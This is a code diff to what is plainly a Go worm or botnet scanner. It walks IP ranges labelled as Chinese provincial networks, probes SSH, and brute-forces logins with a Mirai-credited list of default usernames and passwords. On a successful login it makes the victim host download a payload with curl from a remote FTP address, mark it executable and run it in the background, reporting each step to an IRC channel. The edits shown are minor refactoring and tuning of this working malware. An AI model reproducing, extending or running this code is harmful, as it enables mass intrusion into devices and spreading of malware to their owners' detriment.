@@ -13,7 +13,7 @@ import (
 var Scan_Switch bool
 
 const (
-	//CHINANET Hubei province network
+	//CHINANET Hubei province network.
 	chpn1 = "116.211" //116.211.255.255
 	chpn2 = "119."    //119.96.0.0 - 119.97.255.255
 	chpn3 = "119.102" //119.102.255.255
@@ -21,7 +21,7 @@ const (
 	chpn5 = "58.53"   //58.53.255.255
 	chpn6 = "221."    //221.234.0.0 - 221.235.255.255
 
-	//CHINANET Guangdong province network
+	//CHINANET Guangdong province network.
 	cgpn1 = "14.116" //114.116.255.255
 	cgpn2 = "14.118" //114.118.255.255
 	cgpn3 = "14.127" //14.127.255.255
@@ -76,7 +76,7 @@ func nextIP(ipRange string) string {
 
 func checkPort(_ipRange string) string {
 	ptrIP := &_ipRange
-	conn, err := net.DialTimeout("tcp", *ptrIP, 500*time.Millisecond)
+	conn, err := net.DialTimeout("tcp", *ptrIP, 1*time.Second)
 	if err != nil {
 		return ""
 	}
@@ -104,30 +104,30 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 }
 
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
-	NetArr := []string{
+	NetList := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
 		cgpn1, cgpn2, cgpn3, cgpn4,
 	}
 
 	/*
 		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
-		Add more usernames and passwords in to The array name "userList" and "passList".
+		Add more usernames and passwords in to The slice name "userList" and "passList".
 	*/
 	userList := []string{
 		"admin", "root", "user", "guest", "support", "login",
 	}
 
 	passList := []string{
-		"", "root", "admin", "123456", "password", "default", "54321", "888888",
-		"1111", "1111111", "1234", "12345", "pass", "xc3511", "vizxv", "xmhdipc",
-		"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
-		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
-		"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
+		"", "admin", "root", "user", "guest", "support", "login", "password",
+		"default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass",
+		"54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111",
+		"ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234", "jvbzd",
+		"klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin", "7ujMko0vizxv",
 	}
 
 	for {
-		for net := range NetArr {
-			target := nextIP(NetArr[net])
+		for net := range NetList {
+			target := nextIP(NetList[net])
 			ptrTarget := &target
 			turnRange := checkPort(*ptrTarget)
 
@@ -144,13 +144,14 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
 							ssh_session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
 							IRC_Report(reportIRC, set_chan, "\"curl\" Success on "+turnRange)
+							time.Sleep(10 * time.Second)
 							ssh_session(_session, "chmod +x ."+set_payload)
 							go ssh_session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
-							IRC_Report(reportIRC, set_chan, "Failed to login to "+turnRange+
-								" > "+fmt.Sprintf("%v", userList[user])+":"+fmt.Sprintf("%v", passList[pass]))
+							IRC_Report(reportIRC, set_chan, "Failed to login to "+
+								turnRange+" > "+fmt.Sprintf("%v:%v", userList[user], passList[pass]))
 						}
 					}
 					if logCheck || Scan_Switch {
